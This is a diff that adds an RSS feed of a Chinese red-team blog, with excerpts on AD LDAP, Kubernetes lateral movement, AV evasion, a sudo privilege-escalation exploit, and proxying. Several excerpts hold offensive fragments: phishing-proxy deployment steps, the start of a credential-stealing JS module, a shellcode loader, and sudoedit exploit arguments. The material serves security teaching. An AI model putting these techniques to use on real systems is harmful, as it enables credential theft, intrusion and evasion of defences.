@@ -1,0 +1,397 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>倾旋的博客</title>
+    <link>https://payloads.online/</link>
+    <description>Recent content on 倾旋的博客</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Wed, 11 Aug 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://payloads.online/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Windows活动目录中的LDAP</title>
+      <link>https://payloads.online/archivers/2021-08-11/1/</link>
+      <pubDate>Wed, 11 Aug 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-08-11/1/</guid>
+      <description>LDAP基础概念 条目（Entry） 一个条目有若干个属性，每一个属性应对一个或多个值，有些条目可以包含若干个子条目。
+这里使用Active Directory Explorer连接一个域环境进行展示：
+其中 DC=domain.16,DC=local 以下（包含本身），都是条目，每一个条目点开都拥有N个属性名和属性值，右侧密密麻麻的就是属性名和属性值。
+识别名（Distinguished Name, DN） 它表示条目在LDAP目录树中从根出发的绝对路径，是条目的唯一标识。其中上一节中的DC=domain16,DC=local就是域的根，这个根的DN就是DC=domain16,DC=local，根的DN通常被称为Base DN。
+我们随便点开一个计算机条目观看，发现他们都拥有一个objectCatory属性，这个属性的值就是用于描述条目的路径，也就是说，如果要从LDAP中精确的寻找到某个对象，就可以通过DN来寻找，编程的思路也是如此。
+相对识别名（Relative Distinguished Name, RDN） 例如上方的USERPC1的DN为：CN=USERPC1,CN=Computers,DC=domain16,DC=local，那么CN=USERPC1,CN=Computers就是RDN，RDN是相对于Base DN的DN。
+在一般情况下，RDN 以 dc=、ou=、c=、o= 开头的条目为容器，可以包含子条目。
+模式（Schema） 模式是对象类（ObjectClass）、属性类型（AttributeType）、属性语法（Syntax）和匹配规则（MatchingRules）的集合。
+对象类（ObjectClass） 对象类封装了必选的属性和可选的属性，同时对象类也是支持继承的。通过对象类可以很方便地指定条目的类型，一个条目也可以绑定多个对象类。
+例如在Windows域内，每一个计算机都至少继承了computer类：
+属性类型（AttributeType） 属性类型定义了属性值的设定规则（属性语法），以及同一个属性的各个数据相互比较的规则等。
+LDAP Filter 进阶 LDAP objectCategory与objectClass 微软的网站上有一篇关于LDAP Filter非常详细的文章：https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx
+获取所有域内计算机对象 通过ldapsearch可以跟进不同的条件去检索域内的数据，上面的表格中明确了objectCategory属性与objectClass属性组合可以获取指定对象，通过这个表格，我们尝试获取域内的所有机器:
+ldapsearch -h 192.168.49.132 -b dc=domain16,dc=local -D cn=zhangsan,ou=officeuser,dc=domain16,dc=local -w San@123 objectClass=computer dn LDAP Search Option 说明:
+ -H	ldapuri，格式为ldap://机器名或者IP:端口号，不能与-h和-p同时使用 -h	LDAP服务器IP或者可解析的hostname，与-p可结合使用，不能与-H同时使用 -p	LDAP服务器端口号，与-h可结合使用，不能与-H同时使用 -x	使用简单认证方式 -D	所绑定的服务器的DN -w	绑定DN的密码，与-W二者选一 -W	不输入密码，会交互式的提示用户输入密码，与-w二者选一 -f	指定输入条件，在RFC 4515中有更详细的说明 -c	出错后忽略当前错误继续执行，缺省情况下遇到错误即终止 -n	模拟操作但并不实际执行，用于验证，常与-v一同使用进行问题定位 -v	显示详细信息 -d	显示debug信息，可设定级别 -s	指定搜索范围, 可选值：base|one|sub|children  获取所有域内用户对象 这里涉及到LDAP的条件逻辑运算，LDAP共有6个逻辑运算符，分别如下：</description>
+    </item>
+    
+    <item>
+      <title>Kubernetes(K8s)横向移动办法</title>
+      <link>https://payloads.online/archivers/2021-07-20/1/</link>
+      <pubDate>Tue, 20 Jul 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-07-20/1/</guid>
+      <description>博客半年没写了，来除除草&amp;hellip;. :(
+ 0x01 Kubernetes 简介 Kubernetes 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。
+传统部署时代：
+早期，各个组织机构在物理服务器上运行应用程序。无法为物理服务器中的应用程序定义资源边界，这会导致资源分配问题。 例如，如果在物理服务器上运行多个应用程序，则可能会出现一个应用程序占用大部分资源的情况， 结果可能导致其他应用程序的性能下降。 一种解决方案是在不同的物理服务器上运行每个应用程序，但是由于资源利用不足而无法扩展， 并且维护许多物理服务器的成本很高。
+虚拟化部署时代：
+作为解决方案，引入了虚拟化。虚拟化技术允许你在单个物理服务器的 CPU 上运行多个虚拟机（VM）。 虚拟化允许应用程序在 VM 之间隔离，并提供一定程度的安全，因为一个应用程序的信息 不能被另一应用程序随意访问。
+虚拟化技术能够更好地利用物理服务器上的资源，并且因为可轻松地添加或更新应用程序 而可以实现更好的可伸缩性，降低硬件成本等等。
+每个 VM 是一台完整的计算机，在虚拟化硬件之上运行所有组件，包括其自己的操作系统。
+容器部署时代：
+容器类似于 VM，但是它们具有被放宽的隔离属性，可以在应用程序之间共享操作系统（OS）。 因此，容器被认为是轻量级的。容器与 VM 类似，具有自己的文件系统、CPU、内存、进程空间等。 由于它们与基础架构分离，因此可以跨云和 OS 发行版本进行移植。
+ 以上摘自Kubernetes官方文档：https://kubernetes.io/zh/docs/concepts/overview/what-is-kubernetes/
+ 0x02 Kubernetes 关键概念介绍 Kubernetes有如下几个与本文相关的概念：
+ 节点(Node) Pod 容忍度(Toleration)与污点(Taint)  节点(Node) Kubernetes 通过将容器放入在节点（Node）上运行的 Pod 中来执行你的工作负载。 节点可以是一个虚拟机或者物理机器，取决于所在的集群配置。最容易理解的例子：
+该集群有三个节点，我可以在这三个节点上创建很多个Pod，而Pod中可以包含多个容器。在所有的节点中，至少要有一个Master节点，Master节点是第一个加入集群的机器，它具有整个集群的最高权限，本文的目的就是研究如何通过其他节点，横向移动到Master节点，因为Secret敏感信息(令牌、账户密码、公私钥等等)都存储在Kubernetes的etcd数据库上。
+Pod Pod是可以在 Kubernetes 中创建和管理的、最小的可部署的计算单元。
+Pod（就像在鲸鱼荚或者豌豆荚中）是一组（一个或多个） 容器； 这些容器共享存储、网络、以及怎样运行这些容器的声明。 Pod中的内容总是并置（colocated）的并且一同调度，在共享的上下文中运行。 Pod所建模的是特定于应用的“逻辑主机”，其中包含一个或多个应用容器， 这些容器是相对紧密的耦合在一起的。 在非云环境中，在相同的物理机或虚拟机上运行的应用类似于 在同一逻辑主机上运行的云应用。</description>
+    </item>
+    
+    <item>
+      <title>Pricking 项目（一） ：使用介绍</title>
+      <link>https://payloads.online/archivers/2021-02-18/1/</link>
+      <pubDate>Thu, 18 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-02-18/1/</guid>
+      <description>视频介绍：bv1SK4y1n7xx
+ 0x00 安装项目 Pricking 是一个自动化部署水坑和网页钓鱼的开源项目，本文介绍Pricking 项目的安装与使用。
+$ git clone https://github.com/Rvn0xsy/Pricking $ cd Pricking $ docker-compose up -d 0x01 例子演示 环境：
+ Arch Linux 64Bit 127.0.0.1 攻击机（反向代理服务器） Kali Linux 64Bit 172.16.42.135 受害服务器 攻击者域名 proxy.payloads.online -&amp;gt; 127.0.0.1  假设受害服务器（172.16.42.135 ）有一个站点：
+需要用户输入正确的账号密码才可以访问内部的功能。
+修改docker-compose.yml:
+version: &amp;#39;3&amp;#39; services: nginx: image: rvn0xsy/pricking:v1 ports: - &amp;#34;80:80&amp;#34; volumes: - ./:/tmp/pricking - /etc/hosts:/etc/hosts # 由于是测试，所以修改的是hosts充当DNS服务器，因此需要映射hosts文件。 environment: PROXY_PASS_HOST: proxy.payloads.online PROXY_SOURCE_HOST: 172.16.42.135 NGINX_LISTEN_PORT: 80 EVIL_JS_URI: b026324c6904b2a9cb4b88d6d61c81d1 此时访问http://proxy.payloads.online 就等同于访问受害服务器（172.16.42.135 ）。</description>
+    </item>
+    
+    <item>
+      <title>Pricking 项目（二） ：JS模块开发</title>
+      <link>https://payloads.online/archivers/2021-02-18/2/</link>
+      <pubDate>Thu, 18 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-02-18/2/</guid>
+      <description>视频介绍：bv1SK4y1n7xx
+ 0x00 目录结构介绍 . ├── access.log # 日志文件 ├── docker-compose.yml # 容器配置文件 ├── README.md # 说明文档 └── static # 静态文件夹 ├── index.html # 测试页面 ├── modules # JS模块目录 │ └── cookie.js # cookie相关模块 ├── README.md # JS模块文档 └── static.js # 主静态文件，会被默认加载到页面中 2 directories, 7 files 0x01 新建模块 - 窃取凭证 首先用VScode打开项目目录，在modules中新建一个getpass.js文件：
+写入代码：
+/* 模拟一个对话框 prompt(&amp;#34;请输入账号：&amp;#34;) 用户输入 账号 用户输入 密码 保存凭证 */ export function getPassword(u_info, p_info){ var cert = new Object(); cert.</description>
+    </item>
+    
+    <item>
+      <title>红队技巧：基于反向代理的水坑攻击</title>
+      <link>https://payloads.online/archivers/2021-02-16/1/</link>
+      <pubDate>Tue, 16 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-02-16/1/</guid>
+      <description>完整项目代码：https://github.com/Rvn0xsy/Pricking
+0x00 前言 在红队行动中，一般使用邮件钓鱼会携带诱饵附件，但常被邮件网关拦截，如果想要去收集更多的有效信息，可以在邮件中埋入水坑链接。而埋入的水坑的制作，对于红队来说又有些繁琐，因此本文记录一下我实现自动化这块的工作。
+0x01 实现目标 先明确一下实现目标：
+ 支持快速部署 完美克隆任意网站 可扩展的模块（受害者执行） 收集所有凭证（除了Cookie还有POST数据）  0x02 快速部署与完美克隆 互联网上有许多网页克隆的工具，大多都是将网页的前端文件（html、js、图片等）下载到本地，这个方式即使自动化也很难与网站真实后端无缝对接。于是我采用Nginx的反向代理功能来实现完美克隆，让我的Web服务器充当一个真实的客户端。但Nginx本身默认情况下，没办法做到很灵活的逻辑操作，因此需要采用OpenResty内置的Lua脚本Block。
+OpenResty® 是一个基于 Nginx 与 Lua 的高性能 Web 平台，其内部集成了大量精良的 Lua 库、第三方模块以及大多数的依赖项。用于方便地搭建能够处理超高并发、扩展性极高的动态 Web 应用、Web 服务和动态网关。
+根据它的官方文档和开源仓库我找到了Docker环境，使用Docker镜像就能解决快速部署的问题了。
+首先拉取镜像到本地，方便后续的操作：
+docker pull openresty/openresty:alpine OpenResty配置文件 OpenResty Docker环境共有两块需要关注的配置文件：
+ /etc/nginx/conf.d /usr/local/openresty/nginx/conf/nginx.conf  其中主配置文件是最精简的，我根据OpenResty的文档优化了一个，后续Dockerfile的编写也是替换的主配置文件。
+OpenResty - Lua Ngx API 若想要在Nginx配置中执行Lua代码，需要遵循Lua Ngx API，文档中提供了*_by_lua，*_by_lua_block和*_by_lua_file来引入Lua代码。
+nginx.conf简单实例：
+worker_processes 1; error_log logs/error.log error; # 日志级别 events { worker_connections 1024; } http { server { listen 80; location / { content_by_lua_block { ngx.</description>
+    </item>
+    
+    <item>
+      <title>CVE-2021-3156 - Exploit修改</title>
+      <link>https://payloads.online/archivers/2021-02-09/1/</link>
+      <pubDate>Tue, 09 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-02-09/1/</guid>
+      <description>New-Exploit : https://github.com/Rvn0xsy/CVE-2021-3156-plus
+0x01 为什么要修改？ 本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。
+0x02 Linux 管道符 在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：
+echo &amp;#34;new-pass&amp;#34; | passwd --stdin username  该命令只适用于旧版，不建议在命令行中传递明文密码
+ 于是我查看了sudoedit的帮助参数：
+设置-S参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。
+0x03 Exploit分析 本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用execve触发。
+#include &amp;lt;unistd.h&amp;gt; int execve(const char *pathname, char *const argv[],char *const envp[]); 在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：
+char* sudoedit_argv[] = { &amp;#34;sudoedit&amp;#34;, &amp;#34;-S&amp;#34;, // --stdin 非交互式  &amp;#34;-s&amp;#34;, buf, NULL}; 紧接着，需要思考如何传入密码了。
+ 经过测试，即使密码错误的情况下，也能够提权成功。
+ 经过查阅资料，关于execve的特点如下：
+execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。
+All process attributes are preserved during an execve(), except the following:
+ The dispositions of any signals that are being caught are reset to the default (signal(7)).</description>
+    </item>
+    
+    <item>
+      <title>静态恶意代码逃逸（第十课）</title>
+      <link>https://payloads.online/archivers/2021-02-08/1/</link>
+      <pubDate>Mon, 08 Feb 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-02-08/1/</guid>
+      <description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+0x01 UUID 通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象。 — 来源：维基百科
+关于Windows中的GUID也等同于UUID，先看一下结构：
+typedef struct _GUID { unsigned long Data1; // 4字节  unsigned short Data2; // 2字节  unsigned short Data3; // 2字节  unsigned char Data4[8]; // 8字节 } GUID; 总和一共16字节，16*8 = 128位。
+0x02 与UUID相关的Windows API RPC_STATUS UuidFromString( RPC_CSTR StringUuid, UUID *Uuid ); 功能：将字符串UUID转换为UUID结构。
+RPC_STATUS UuidCreate( UUID *Uuid ); 功能：创建UUID结构。
+int UuidEqual( UUID *Uuid1, UUID *Uuid2, RPC_STATUS *Status ); 功能：判断两个UUID是否相等。</description>
+    </item>
+    
+    <item>
+      <title>Windows权限控制相关的防御与攻击技术</title>
+      <link>https://payloads.online/archivers/2021-01-31/1/</link>
+      <pubDate>Sun, 31 Jan 2021 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2021-01-31/1/</guid>
+      <description>0x00 前言 近年来终端安全检测与响应的产品发展迅速，我们不得不意识到，安全是在一个循环中发展的，从人们意识到安全开始，大部分了解到层面都是病毒、木马，然后接着是浏览器相关的Web安全领域，最后又开始回到终端。这个议题我们通过了解Windows操作系统下的访问控制技术，站在攻防的不同角度去进行对抗，提升自身的知识储备，个人觉得这些知识适用于许多使用Windows操作系统的用户。
+0X01 安全描述符(Security Descriptors，SD) 在Windows中，每一个安全对象实体都拥有一个安全描述符，安全描述符包含了被保护对象相关联的安全信息的数据结构，它的作用主要是为了给操作系统提供判断来访对象的权限。
+0:000&amp;gt; dt nt!_security_descriptor ntdll!_SECURITY_DESCRIPTOR +0x000 Revision : UChar # 版本 +0x001 Sbz1 : UChar # 大小 +0x002 Control : Uint2B # 一组标志，用于限定安全描述符或安全描述符的各个字段的含义 +0x008 Owner : Ptr64 Void # 指定对象的所有者（SID） +0x010 Group : Ptr64 Void # 指定对象的主组（SID） +0x018 Sacl : Ptr64 _ACL # 系统访问控制列表 +0x020 Dacl : Ptr64 _ACL # 自主访问控制列表 Windows具体有哪些安全对象？  进程 线程 文件 服务 计划任务 互斥体 管道 油槽 文件共享 访问令牌 注册表 打印机 作业 &amp;hellip;  一般情况下，大部分用户接触更多的可能就是文件了，我们就以文件开始，文件对于我们去学习访问控制是最直观的。</description>
+    </item>
+    
+    <item>
+      <title>静态恶意代码逃逸（第九课）</title>
+      <link>https://payloads.online/archivers/2020-11-29/2/</link>
+      <pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-11-29/2/</guid>
+      <description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+0x01 数据执行保护（DEP） DEP(Data Execution Prevention)即“ 数据执行保护”，这是Windows的一项安全机制，主要用来防止病毒和其他安全威胁对系统造成破坏。 微软从Windows XP SP2引入了该技术，并一直延续到今天。
+为什么要有DEP 在Windows Xp SP2 之前的时代，缓冲区溢出漏洞利用门槛太低了，只要发现有缓冲区溢出漏洞，就可以直接稳定利用，攻击者只需要将Shellcode不断写入堆栈，然后覆盖函数返回地址，代码就可以在堆栈中执行。但堆栈的用途主要是保存寄存器现场，提供一个函数运行时的存储空间，极少数需要代码在堆栈中执行，于是微软为了缓解类似的情况，发明了DEP保护机制，用于限制某些内存页不具有可执行权限。
+0x02 如何绕过DEP VirtualProtect这个API能够更改内存页的属性为可执行或不可执行，对于二进制漏洞利用来说，溢出的时候，把返回地址设计为VirtualProtect的地址，再精心构造一个栈为调用这个API的栈，就可以改变当前栈的内存页的属性，使其从&amp;quot;不可执行&amp;quot;变成&amp;quot;可执行&amp;quot;。
+0x03 举一反三 由此说来，Shellcode执行其实也需要一个可执行的内存页，那么还有哪些API能够构造一个可执行的内存页呢？
+HeapCreate可以在进程中创建辅助堆栈，并且能够设置堆栈的属性：
+HANDLE WINAPI HeapCreate( __in DWORD flOptions, __in SIZE_T dwInitialSize, __in SIZE_T dwMaximumSize ); 第一个参数flOptions用于修改如何在堆栈上执行各种操作。 你可以设定0、HEAP_NO_SERIALIZE、HEAP_GENERATE_EXCEPTIONS、HEAP_CREATE_ENABLE_EXECUTE或者是这些标志的组合。
+ HEAP_NO_SERIALIZE：对堆的访问是非独占的，如果一个线程没有完成对堆的操作，其它线程也可以进程堆操作，这个开关是非常危险的，应尽量避免使用。 HEAP_GENERATE_EXCEPTIONS：当堆分配内存失败时，会抛出异常。如果不设置，则返回NULL。 HEAP_CREATE_ENALBE_EXECUTE：堆中存放的内容是可以执行的代码。如果不设置，意味着堆中存放的是不可执行的数据。  看到HEAP_CREATE_ENALBE_EXECUTE相信很多人能够恍然大悟，我们的Shellcode可以存入这个辅助堆栈中，然后创建一个线程运行它即可。
+0x04 Shellcode执行 #include &amp;lt;iostream&amp;gt;#include &amp;lt;Windows.h&amp;gt; int main() { char shellcode[] = &amp;#34;123&amp;#34;; HANDLE hHep = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, 0, 0); PVOID Mptr = HeapAlloc(hHep, 0, sizeof(shellcode)); RtlCopyMemory(Mptr, shellcode, sizeof(shellcode)); DWORD dwThreadId = 0; HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)Mptr, NULL, NULL, &amp;amp;dwThreadId); WaitForSingleObject(hThread, INFINITE); std::cout &amp;lt;&amp;lt; &amp;#34;Hello World!</description>
+    </item>
+    
+    <item>
+      <title>静态恶意代码逃逸（第八课）</title>
+      <link>https://payloads.online/archivers/2020-11-29/1/</link>
+      <pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-11-29/1/</guid>
+      <description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+0x01 字符串 一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到。
+例如：
+#include &amp;lt;stdio.h&amp;gt; char global_string[] = &amp;#34;123456&amp;#34;; int main(){ printf(&amp;#34;%s \n&amp;#34;, global_string); } 如果编写的是一些敏感参数的工具，很容易会被提取出特征，例如lcx这款工具，它的参数如下：
+[Usage of Packet Transmit:] lcx -&amp;lt;listen|tran|slave&amp;gt; &amp;lt;option&amp;gt; [-log logfile] [option:] -listen &amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitPort&amp;gt; -tran&amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitHost&amp;gt; &amp;lt;TransmitPort&amp;gt; -slave &amp;lt;ConnectHost&amp;gt; &amp;lt;ConnectPort&amp;gt; &amp;lt;TransmitHost&amp;gt;&amp;lt;TransmitPort&amp;gt; 其中，-listen、-tran、-slave非常敏感，一般常见程序不会高频使用这些参数名，因此落地被杀也是意料之中。
+0x02 C++ 重载运算符 C++ 允许在同一作用域中的某个函数和运算符指定多个定义，分别称为函数重载和运算符重载。
+这里需要使用重载运算符来方便我们编程： 重载的运算符是带有特殊名称的函数，函数名是由关键字 operator 和其后要重载的运算符符号构成的。与其他函数一样，重载运算符有一个返回类型和一个参数列表。
+简单的例子如下：
+#pragma once #include &amp;lt;iostream&amp;gt;#include &amp;lt;string&amp;gt;#include &amp;lt;Windows.h&amp;gt; class BadString { protected: DWORD dwStrLength = 0; std::string szOutStr; std::string Base64decode(std::string szBase64String, LPDWORD lpdwLen); public: BadString(std::string szInStr); operator std::string(); ~BadString(); }; #include &amp;#34;BadString.</description>
+    </item>
+    
+    <item>
+      <title>Linux透明代理在红队渗透中的应用</title>
+      <link>https://payloads.online/archivers/2020-11-13/1/</link>
+      <pubDate>Fri, 13 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-11-13/1/</guid>
+      <description>0x00 前言 决定写这篇文章是我解决了所有问题以后决定记录一下这个过程所写的，因此可能会忽略很多细节上的东西。
+ 问题一：打点的时候经常会被WAF封禁IP怎么办？ 问题二：内网的时候只想代理部分目的地址怎么办？  我想大部分人解决问题一的方案就是不断切换出口IP，使得出口地址一直改变，避免被封，而解决问题二的方案可能就是Proxifier或者Proxycap。
+ Proxifier是一款能够实现系统全局代理的软件，它支持的代理类型有：Http、Https、Socks4a、Socks5.
+ 在使用Windows渗透的过程中，我经常使用Proxifier来实现进程单位的代理进行内网渗透，利用好rules就能避免系统全局流量被导入代理，流量流入内网从而暴露自己的一些信息。
+以上两个问题在Windows下不是问题，我之前经常使用Kali Linux来进行渗透，自从更新版本以后，它设置系统代理需要自己写PAC文件，这一点增加了一点点学习门槛，并且好像不是那么好用。最近我使用Arch Linux已经有段时间了，并且把它安装在了我的工作机、家庭电脑上，我非常喜欢这个操作系统和这个操作系统的生态。
+因此我不得不开始完全适应更多在Linux上渗透的场景，这也让我收获颇多，这篇文章就记录一下我如何学习自己搭建透明代理实现愉快的工作环境。
+0x01 透明代理 什么是透明代理？ 透明代理的意思是客户端根本不需要知道有代理服务器的存在，它改变你的request fields（报文），并会传送真实IP，多用于路由器的NAT转发中。
+为什么要用到透明代理？ 因为这样能够让我的机器“身处”在内网中，也能让我的机器在“世界上的任何角落里”。
+大家都知道，在Linux下常规的内网渗透需要使用一些如：proxychains的工具实现指定的进程访问内网的资源，相当于给程序套了一层代理。
+它的实现原理如下：
+ ProxyChains is a UNIX program, that hooks network-related libc functions in dynamically linked programs via a preloaded DLL and redirects the connections through SOCKS4a/5 or HTTP proxies.
+ 关于LD_PRELOAD之前有写过相关文章：Linux权限维持之LD_PRELOAD
+它的缺点却是每个命令必须要在前面加上proxychains，这样Bash shell有时候可能不会正常工作给我们进行参数提示。
+我要做的就是使用iptables实现透明代理，让我的机器所有与目标地址相关的流量都导入socks5代理端口。
+题外话一，关闭proxychains的输出信息可以将/etc/proxychains.conf文件中的quiet_mode前面的#去除。
+题外话二，设置metasploit全局代理的方法：
+可以将metasploit全局变量proxies的值进行设置来使得后续所有的流量都经过代理发出，这样能够达到内网穿透的效果。
+ 图中演示了2层代理的设置
+ 0x02 Linux下的iptables防火墙 iptables是一个用户空间实用程序，它允许系统管理员配置Linux内核防火墙的IP数据包过滤器规则，这些规则实现为不同的Netfilter模块。筛选器组织在不同的表中，这些表包含有关如何处理网络流量数据包的规则链。当前，不同的内核模块和程序用于不同的协议。iptables适用于IPv4，ip6tables适用于IPv6，arptables适用于ARP，而ebtables适用于以太网帧。
+学习iptables有一点门槛，需要对表、规则链、动作等关系有一定的了解，这里不继续铺垫，可以自行搜索关于iptables的文章。
+流量导入Socks代理 通过将规则插入到NAT表的PREROUTING链中，可以轻松地重定向传入流量。</description>
+    </item>
+    
+    <item>
+      <title>Web正向代理的思考</title>
+      <link>https://payloads.online/archivers/2020-11-01/1/</link>
+      <pubDate>Sun, 01 Nov 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-11-01/1/</guid>
+      <description>0x01 背景假设 获取Webshell后，但是机器不出网（DNS、TCP、UDP）等常规端口都进行了尝试。
+不出网的解释：内部的Webshell服务器无法连接互联网。
+尝试过的方案有：
+title 出网探测方式 state TCP { WindowsHttp : certutil -f -split -urlcache http://domain/com LinuxHttp: wget &amp;lt;URL&amp;gt; } state UDP{ DNS : nslookup domain.com } state ICMP{ ICMP: ping domain.com } 那么，一般我们会尝试：
+ reGeorg Neo-reGeorg reDuh pivotnacci &amp;hellip;  这种类型的工具往往都有一个特性：通过脚本帮助我们把HTTP协议转换成Socks，由于HTTP协议无状态，因此需要发送大量数据包。
+title 脚本代理 浏览器 -&amp;gt; 本地Socks代理服务 : （1）连接 本地Socks代理服务 &amp;lt;--&amp;gt; 本地HTTP客户端: （2）转换协议 本地HTTP客户端 -&amp;gt; Web服务器脚本: （3）不断请求 本地HTTP客户端 &amp;lt;-- Web服务器脚本: （4）发送响应 本地Socks代理服务&amp;lt;--&amp;gt; 本地HTTP客户端: （5）协议转换 本地Socks代理服务 --&amp;gt; 浏览器: （6）发送数据 note right: 倾旋的博客:https://payloads.</description>
+    </item>
+    
+    <item>
+      <title>静态恶意代码逃逸（第七课）</title>
+      <link>https://payloads.online/archivers/2020-10-23/1/</link>
+      <pubDate>Fri, 23 Oct 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-10-23/1/</guid>
+      <description>代码将会上传至Github，方便读者下载研究 : https://github.com/Rvn0xsy/BadCode
+0x01 导入地址表（IAT）  Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科
+ 如下图所示：
+在PE结构中，存在一个导入表，导入表中声明了这个PE文件会载入哪些模块，同时每个模块的结构中又会指向模块中的一些函数名称。这样的组织关系是为了告诉操作系统这些函数的地址在哪里，方便修正调用地址。
+站在反病毒的角度提出假想：既然所有的PE文件都有导入表，并且声明了一些模块，并且还能通过模块找到导入函数的名称，那么是否能够作为一个文件的风险值的评估方向？
+方法论：
+如果一个文件的文件大小在300KB以内，并且导入函数又有Virtual Alloc、CreateThread，且VirtualAlloc的最后一个参数是0x40，那么此文件是高危文件。
+0x40被定义在winnt.h中：
+#define PAGE_NOACCESS 0x01 #define PAGE_READONLY 0x02 #define PAGE_READWRITE 0x04 #define PAGE_WRITECOPY 0x08 #define PAGE_EXECUTE 0x10 #define PAGE_EXECUTE_READ 0x20 #define PAGE_EXECUTE_READWRITE 0x40 #define PAGE_EXECUTE_WRITECOPY 0x80 看一下第一课代码编译出来的PE导出表：
+根据这个猜想，我们开始尝试在PE文件中抹去导入函数名称。
+0x02 GetProcAddress获取函数地址 GetProcAddress这个API在Kernel32.dll中被导出，主要功能是从一个加载的模块中获取函数的地址。
+函数声明如下：
+FARPROC GetProcAddress( HMODULE hModule, // 模块句柄  LPCSTR lpProcName // 函数名称 ); FARPROC被定义在了minwindef.h中，声明如下：
+#define WINAPI __stdcall  typedef int (FAR WINAPI *FARPROC)(); 跟进它的声明能够发现是一个函数指针，也就是说GetProcAddress返回的是我们要找的函数地址。</description>
+    </item>
+    
+    <item>
+      <title>这是一个充满挑战的好时代</title>
+      <link>https://payloads.online/archivers/2020-08-24/1/</link>
+      <pubDate>Mon, 24 Aug 2020 00:00:00 +0000</pubDate>
+      
+      <guid>https://payloads.online/archivers/2020-08-24/1/</guid>
+      <description>我经常会写一些不着边际的东西，从我博客文章就可以看出现在的风格，前言不搭后语、文章主体和内容松散不一，说来惭愧，文化程度不高，也想抽空读读书花点功夫补缺一下。
+近期发生了很多的事儿，很多时候在晚上会产生一些感触，但是都没有把它们给记录下来，现在点来一支烟，慢慢回忆……
+第一个思考：我感受到了自动化时代的冲击 听闻关于演练的消息，也就一天时间，不知消息真假的情况下开始推论参赛厂商的自动化覆盖程度，发现整个行业的意识形态已经建立，未来（或已经存在的）漏洞战争的趋势已经开始逼近。
+关于自动化的设计，我们早期已经着手将基本的信息获取、清洗、统计、归类、存储整个过程完成，但就此一战，能很明显的发现自动化是有阶段的，我们还处于第一阶段。起初，我们为了加速红队的“行动”，做了诸多的考虑。我认为，为了完成整个行动的自动化是不太现实的，难点在于经验如何转化为机器的逻辑。步子不能迈的太大，我先分解一下我理想的自动化阶段。
+第一阶段：单从基本信息收集的具备 涉及多个维度，域名、子域名、IP、系统、端口、服务、Http服务相关组件等，互联网上的大部分工具、平台可能大部分已经满足这些最小颗粒度，但有些工具、平台就是偏离真正的需求。
+第二阶段：基本信息收集的数据支撑 同样涉及多个角度，主动扫描、网络空间搜索引擎数据接口、组件指纹精准度、识别技术方案等。未来主动扫描可能用的会越来越少，依赖接口的会更多一些，接口只要更加实时的更新数据即可，然后确保构建好指纹的精准度，做到不漏掉一处资产的特征就很成功了。最早接触的一个网络空间搜索引擎是Shodan，我经过查阅Wiki百科发现它最早在2013年做起来，距今已经7年，在常规的渗透中，也会偶尔使用它来寻找一些有趣的资产，在IPV4的时代下，它已经算是一个“活地图”了，这里可以思考一个有趣的问题，当世界上更普遍使用IPv6以后，是否还会有类似的“活地图”呢？
